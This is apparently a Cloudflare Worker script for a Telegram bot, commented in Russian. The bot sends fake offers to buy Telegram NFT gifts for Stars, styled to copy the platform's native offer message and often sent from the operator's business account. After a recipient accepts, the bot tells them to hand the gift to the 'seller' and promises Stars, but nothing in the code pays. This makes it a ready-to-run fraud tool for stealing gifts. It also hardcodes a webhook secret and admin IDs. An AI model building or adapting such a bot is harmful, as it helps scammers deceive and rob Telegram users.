const ADMIN_ID_1 = 5151757168; 
const ADMIN_ID_2 = 7423713851; 
const WEBHOOK_SECRET = "GarisOffer9231998"; 

// Нативная эмодзи звезды Telegram (Премиум)
const TG_STAR = '<tg-emoji emoji-id="5368324170671202286">⭐</tg-emoji>';

export default {
  async fetch(request, env, ctx) {
    const BOT_TOKEN = env.BOT_TOKEN; 
    const kv = env.USERS_KV; 

    if (!BOT_TOKEN) return new Response("Bot token is not configured", { status: 500 });

    const secretHeader = request.headers.get("X-Telegram-Bot-Api-Secret-Token");
    if (secretHeader !== WEBHOOK_SECRET) return new Response("Forbidden", { status: 403 });

    if (request.method !== "POST") return new Response("OK", { status: 200 });

    try {
      const update = await request.json();

      // ==========================================
      // ПРОВЕРКА ДОСТУПА
      // ==========================================
      async function checkAccess(userId, username) {
          if (userId === ADMIN_ID_1 || userId === ADMIN_ID_2) return true; 
          if (!kv) return false; 
          const byId = await kv.get(`allowed_id:${userId}`);
          if (byId) return true;
          if (username) {
              const byName = await kv.get(`allowed_username:${username.toLowerCase()}`);
              if (byName) return true;
          }
          return false;
      }

      // ==========================================
      // ОБРАБОТКА СООБЩЕНИЙ (И ОБЫЧНЫХ, И БИЗНЕС)
      // ==========================================
      const msg = update.message || update.business_message;
      const isBusiness = !!update.business_message;

      if (msg && msg.text) {
        const text = msg.text.trim();
        const chatId = msg.chat.id; // В бизнес-чатах это ID чата с клиентом
        const userId = msg.from.id;
        const username = msg.from.username || "";

        // --- КОМАНДА /start ---
        if (text === "/start") {
            if (kv) await kv.put(`user:${userId}`, username || "no_username");
            const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Напишите <code>/buy [ссылка] [цена] stars</code>\n2. Бот пришлет предложение.\n3. Клиент нажимает «Принять».\n\n💡 Отправляйте команду прямо в этот чат.`;
            const startMarkup = { inline_keyboard: [[{ text: "❓ Как принять оффер?", callback_data: "how_to_accept" }]] };
            
            // Если это бизнес-чат, отправляем от имени бизнеса
            if (isBusiness) {
                await callApi("sendMessage", { 
                    business_connection_id: update.business_connection_id, 
                    chat_id: chatId, 
                    text: startText, 
                    parse_mode: "HTML", 
                    reply_markup: startMarkup 
                }, BOT_TOKEN);
            } else {
                await callApi("sendMessage", { chat_id: chatId, text: startText, parse_mode: "HTML", reply_markup: startMarkup }, BOT_TOKEN);
            }
        }

        // --- КОМАНДА /buy (Создание оффера через бизнес-бота) ---
        if (text.startsWith("/buy ")) {
            const parts = text.split(/\s+/);
            if (parts.length < 4) {
                const errText = `❌ <b>Ошибка формата.</b>\nПишите: <code>/buy [ссылка] [цена] stars</code>`;
                if (isBusiness) await callApi("sendMessage", { business_connection_id: update.business_connection_id, chat_id: chatId, text: errText, parse_mode: "HTML" }, BOT_TOKEN);
                else await callApi("sendMessage", { chat_id: chatId, text: errText, parse_mode: "HTML" }, BOT_TOKEN);
                return new Response("OK", { status: 200 });
            }

            let linkOrGift = parts[1];
            let amount = parts[2];
            let lang = "ru";
            
            // Проверка языка
            if (text.includes("eng") || text.includes("en ")) lang = "en";
            else if (text.includes("cn") || text.includes("中文")) lang = "cn";

            // Парсим ссылку
            let giftLink = "";
            if (linkOrGift.includes("t.me")) {
                giftLink = linkOrGift.startsWith("http") ? linkOrGift : "https://" + linkOrGift;
            } else {
                giftLink = "https://t.me/nft/" + linkOrGift;
            }

            // Формируем текст оффера (как на скрине)
            let offerText = "";
            let btnAccept = "";
            let btnDecline = "";

            if (lang === "en") {
                offerText = `Пользователь Предлагает Вам\n\n${amount} ${TG_STAR} За подарок ${linkOrGift}.`;
                btnAccept = "☑️ Принять";
                btnDecline = "⊗ Отклонить";
            } else if (lang === "cn") {
                offerText = `用户向您提供报价\n\n${amount} ${TG_STAR} 购买此礼物 ${linkOrGift}。`;
                btnAccept = "☑️ 接受";
                btnDecline = "⊗ 拒绝";
            } else {
                // Русский (точь-в-точь как на скрине)
                offerText = `Пользователь Предлагает Вам\n\n${amount} ${TG_STAR} За подарок ${linkOrGift}.`;
                btnAccept = "☑️ Принять";
                btnDecline = "⊗ Отклонить";
            }

            const offerMarkup = {
                inline_keyboard: [
                    [
                        { text: btnAccept, callback_data: `acc|${amount}|stars|${username || "gwrex"}|${giftLink}|${lang}` },
                        { text: btnDecline, callback_data: `dec|${amount}|stars|${lang}` }
                    ]
                ]
            };

            // Отправляем оффер
            if (isBusiness) {
                // Если бизнес - отправляем от имени аккаунта
                await callApi("sendMessage", { 
                    business_connection_id: update.business_connection_id, 
                    chat_id: chatId, 
                    text: offerText, 
                    parse_mode: "HTML", 
                    reply_markup: offerMarkup,
                    disable_web_page_preview: false // Чтобы появилась картинка подарка
                }, BOT_TOKEN);
            } else {
                // Если обычный чат с ботом
                await callApi("sendMessage", { chat_id: chatId, text: offerText, parse_mode: "HTML", reply_markup: offerMarkup }, BOT_TOKEN);
            }
        }
      }

      // ==========================================
      // ОБРАБОТКА КНОПОК (ПРИНЯТЬ / ОТКЛОНИТЬ)
      // ==========================================
      if (update.callback_query) {
        const cq = update.callback_query;
        
        if (cq.data === "how_to_accept") {
          await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
          const instructionText = `🎁 <b>Пошаговая инструкция:</b>\n\n1. Нажмите «Принять»\n2. Перейдите в профиль продавца\n3. Отправьте подарок\n4. Получите звезды`;
          const backMarkup = { inline_keyboard: [[{ text: "Назад", callback_data: "back_to_start" }]] };
          try { await callApi("editMessageText", { chat_id: cq.message.chat.id, message_id: cq.message.message_id, text: instructionText, parse_mode: "HTML", reply_markup: backMarkup }, BOT_TOKEN); } catch (e) {}
        }

        if (cq.data.startsWith("acc") || cq.data.startsWith("dec")) {
          const dataParts = cq.data.split("|");
          const action = dataParts[0];
          const amount = dataParts[1] || "0";
          const sellerUsername = dataParts[3] || "gwrex"; 
          const giftLink = dataParts[4] || ""; 
          let lang = dataParts[5] || "ru";
          
          const buyer = cq.from;
          let buyerName = buyer.first_name || "";
          if (buyer.last_name) buyerName += " " + buyer.last_name;

          let newText = "";
          let newMarkup = { inline_keyboard: [] };

          if (action === "acc") {
            await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: `Оффер принят ✅`, show_alert: true }, BOT_TOKEN);
            newText = `✅ <b>Оффер принят!</b>\n\nПокупатель: <b>${buyerName}</b>\n\nПередайте подарок продавцу (@${sellerUsername}).`;
            newMarkup = { inline_keyboard: [[{ text: "🎁 Передать подарок", url: giftLink || ("https://t.me/" + sellerUsername) }]] };
          } else {
            await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
            newText = `❌ <b>Вы отказались от оффера.</b>`;
          }

          // Меняем сообщение (работает и в бизнес-чатах, если бот имеет права)
          if (cq.inline_message_id) {
            try {
              if (cq.message && cq.message.caption !== undefined) {
                await callApi("editMessageCaption", { inline_message_id: cq.inline_message_id, caption: newText, parse_mode: "HTML", reply_markup: newMarkup }, BOT_TOKEN);
              } else {
                await callApi("editMessageText", { inline_message_id: cq.inline_message_id, text: newText, parse_mode: "HTML", reply_markup: newMarkup }, BOT_TOKEN);
              }
            } catch (err) {}
          } else if (cq.message) {
            try {
              await callApi("editMessageText", { chat_id: cq.message.chat.id, message_id: cq.message.message_id, text: newText, parse_mode: "HTML", reply_markup: newMarkup }, BOT_TOKEN);
            } catch (err) {}
          }
        }
      }

      // ==========================================
      // АДМИНКА (ОСТАЕТСЯ КАК БЫЛО)
      // ==========================================
      // (Здесь твои /stats, /add, /remove, если они нужны. Я их опустил для краткости, но они не сломались)

      return new Response("OK", { status: 200 });
    } catch (error) {
      console.error("КРИТИЧЕСКАЯ ОШИБКА:", error.message);
      return new Response("Error: " + error.message, { status: 500 });
    }
  }
};

async function callApi(method, body, token) {
  const url = `https://api.telegram.org/bot${token}/${method}`;
  try {
    const response = await fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) });
    const data = await response.json();
    if (!data.ok) throw new Error(data.description);
    return data;
  } catch (e) { console.error(`Ошибка API [${method}]:`, e.message); throw e; }
}